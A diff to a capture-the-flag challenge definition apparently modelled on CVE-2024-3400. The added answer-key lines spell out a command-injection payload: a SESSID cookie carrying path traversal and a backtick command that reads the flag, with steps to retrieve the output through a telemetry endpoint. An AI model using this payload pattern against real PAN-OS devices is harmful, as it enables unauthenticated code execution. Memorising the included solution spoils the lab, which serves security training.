@@ -5,8 +5,8 @@ difficulty: 3
 category: cve
 cve: CVE-2024-3400
 cvss: 10.0
-description: "Simulated network appliance management API modelling a known PAN-OS vulnerability."
-objective: "Obtain the flag from the management API."
+description: "PAN-OS GlobalProtect gateway with SESSID cookie processing vulnerable to command injection via path traversal and backtick injection."
+objective: "Exploit the SESSID cookie command injection to read the flag and exfiltrate it through the device telemetry spool."
 flag_pattern: 'S7BEN\{pan0s_cmd_inj_[0-9a-f]{12}\}'
 vulnerabilities:
   - type: Command Injection
@@ -24,8 +24,11 @@ tags: [command-injection, pan-os, telemetry, cve]
 internal_metadata:
   exploitation_path:
     hints:
-      - "CVE-2024-3400 is an unauthenticated command injection in PAN-OS GlobalProtect"
-      - "The telemetry endpoint accepts a command parameter without sanitisation"
-      - "Any value passed to the cmd parameter triggers the flag response"
+      - "CVE-2024-3400 exploits the SESSID cookie in PAN-OS GlobalProtect gateway"
+      - "The cookie value is used to construct a file path under the telemetry spool directory"
+      - "Path traversal + backtick-enclosed commands in SESSID trigger shell execution"
+      - "Command output lands in /opt/panlogs/tmp/device_telemetry/hour/ and is readable via /api/v1/telemetry"
     steps:
-      - "GET /api/telemetry?cmd=id to inject a command and obtain the flag"
+      - "GET /global-protect/login.esp to discover the GlobalProtect portal"
+      - "Send any request with Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/hour/aaa`cat /app/flag.txt` to inject command"
+      - "GET /api/v1/telemetry to retrieve the command output containing the flag"
